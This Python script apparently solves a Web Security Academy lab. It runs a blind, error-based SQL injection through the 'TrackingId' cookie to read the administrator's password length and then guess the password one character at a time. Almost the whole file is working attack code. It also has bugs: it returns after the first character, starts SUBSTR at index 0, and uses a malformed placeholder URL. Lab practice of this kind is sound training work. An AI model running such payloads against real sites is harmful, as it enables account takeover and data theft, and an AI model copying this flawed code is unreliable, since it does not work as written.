import requests

url = 'https:/xxx.web-security-academy.net/' #Replace here the url.


class Injection:
    def __init__(self, url):
        self.session = requests.session()
        self.url = url
        self.cookieId = self.getCookie()

    def getCookie(self): #Get value from vulnerable cookie

        self.session.get(self.url)
        return self.session.cookies.get('TrackingId')


    def getLen(self): #Return length from the admin pass

        for length in range(40):
            sqlPayload = f"' AND (SELECT CASE WHEN (LENGTH(password) = {length} ) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a--"
            cookies = {'TrackingId' : self.cookieId + sqlPayload}

            page = bool(self.session.get(self.url, cookies=cookies).ok)
            if not page:
                print('Length : ', length)
                return length


    def getMdp(self): #Brute force admin password letter by letter.

        chars = [chr(i).lower() for i in range(65, 91)] + [str(i) for i in range(0, 10)] #List of lowercase letter and number (0-9)
        length = self.getLen()

        passwd = ''

        print('Password : ', end='')

        for index in range(length):
            for char in chars:
                sqlPayload = f"' AND (SELECT CASE WHEN (SUBSTR(password, {index}, 1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a--" #Sql injection.
                cookies = {'TrackingId' : self.cookieId + sqlPayload}

                page = bool(self.session.get(self.url, cookies=cookies).ok)

                if not page:
                    passwd += char
                    print(char, end='')
                    break

            return '\n End !'


def main():
    sqlInjection = Injection(url)
    print(sqlInjection.getMdp())


if __name__ == '__main__':
    main()
